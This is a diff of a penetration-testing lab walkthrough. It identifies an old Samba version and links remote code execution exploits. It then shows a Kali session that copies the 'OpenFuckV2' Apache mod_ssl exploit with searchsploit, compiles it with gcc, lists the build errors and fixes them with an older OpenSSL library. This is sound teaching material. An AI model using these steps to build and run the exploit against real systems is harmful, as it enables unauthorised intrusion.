@@ -87,15 +87,58 @@ The samba version running on the host is identified using MSF's <code>smb_versio
 <span class="dir"><b>[*]</b></span> Auxiliary module execution completed
 </pre>
 
-Searching online for this samba version also yields an exploit: [Samba < 2.2.8 (Linux/BSD) - Remote Code Execution](https://www.exploit-db.com/exploits/10/)<br>
+Searching online for this samba version also yields an exploit:<br> [Samba < 2.2.8 (Linux/BSD) - Remote Code Execution](https://www.exploit-db.com/exploits/10/)<br>
 MSF: [Samba trans2open Overflow (Linux x86)](https://www.rapid7.com/db/modules/exploit/linux/samba/trans2open)
 
 <h3>Exploitation:80/tcp http</h3>
 
-A copy of the OpenFuckV2.c is copied into the current dir, which contains [instructions on how to update it](http://paulsec.github.io/blog/2014/04/14/updating-openfuck-exploit/). Once updated, trying to compile the exploit in Kali Linux produces some errors using <code>gcc</code>.
+A copy of the OpenFuckV2.c is copied into the current dir, which contains [instructions on how to update](http://paulsec.github.io/blog/2014/04/14/updating-openfuck-exploit/) and compile it. Once updated, trying to compile in Kali Linux produces some errors using <code>gcc</code>:
 
 <pre class="console-output">
-GCC ERRORS GO HERE
+<span class="prompt">root@kali</span>:<span class="dir">~</span># searchsploit -m 764
+Exploit: Apache mod_ssl < 2.8.7 OpenSSL - 'OpenFuckV2.c' Remote Exploit
+    URL: https://www.exploit-db.com/exploits/764/
+   Path: /usr/share/exploitdb/platforms/unix/remote/764.c
+
+Copied to: /root/764.c
+
+<span class="prompt">root@kali</span>:<span class="dir">~</span># ... (Steps Update OpenFuck Exploit) ...
+
+<span class="prompt">root@kali</span>:<span class="dir">~</span># gcc -o OpenFuck 764.c -lcrypto
+764.c:645:24: error: ‘SSL2_MAX_CONNECTION_ID_LENGTH’ undeclared here (not in a function); did you mean ‘SSL_MAX_SSL_SESSION_ID_LENGTH’?
+  unsigned char conn_id[SSL2_MAX_CONNECTION_ID_LENGTH];
+                        ^~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+                        SSL_MAX_SSL_SESSION_ID_LENGTH
+764.c: In function ‘read_ssl_packet’:
+764.c:847:19: error: ‘SSL2_MT_ERROR’ undeclared (first use in this function); did you mean ‘SSL_METHOD’?
+    if ((buf[0] == SSL2_MT_ERROR) && (rec_len == 3)) {
+                   ^~~~~~~~~~~~~
+                   SSL_METHOD
+764.c:847:19: note: each undeclared identifier is reported only once for each function it appears in
+764.c: In function ‘get_server_hello’:
+764.c:979:16: error: ‘SSL2_MT_SERVER_HELLO’ undeclared (first use in this function); did you mean ‘SSL3_MT_SERVER_HELLO’?
+  if (*(p++) != SSL2_MT_SERVER_HELLO) {
+                ^~~~~~~~~~~~~~~~~~~~
+                SSL3_MT_SERVER_HELLO
+764.c: In function ‘send_client_master_key’:
+764.c:1071:10: error: dereferencing pointer to incomplete type ‘EVP_PKEY {aka struct evp_pkey_st}’
+  if (pkey->type != EVP_PKEY_RSA) {
+          ^~
+764.c: In function ‘get_server_verify’:
+764.c:1148:16: error: ‘SSL2_MT_SERVER_VERIFY’ undeclared (first use in this function); did you mean ‘SSL3_MT_SERVER_HELLO’?
+  if (buf[0] != SSL2_MT_SERVER_VERIFY) {
+                ^~~~~~~~~~~~~~~~~~~~~
+                SSL3_MT_SERVER_HELLO
+764.c: In function ‘send_client_finished’:
+764.c:1160:11: error: ‘SSL2_MT_CLIENT_FINISHED’ undeclared (first use in this function); did you mean ‘SSL3_MT_FINISHED’?
+  buf[0] = SSL2_MT_CLIENT_FINISHED;
+           ^~~~~~~~~~~~~~~~~~~~~~~
+           SSL3_MT_FINISHED
+764.c: In function ‘get_server_finished’:
+764.c:1173:16: error: ‘SSL2_MT_SERVER_FINISHED’ undeclared (first use in this function); did you mean ‘SSL3_MT_SERVER_DONE’?
+  if (buf[0] != SSL2_MT_SERVER_FINISHED) {
+                ^~~~~~~~~~~~~~~~~~~~~~~
+                SSL3_MT_SERVER_DONE
 </pre>
 
 This can be solved by running <code>apt-get install libssl1.0-dev</code>.
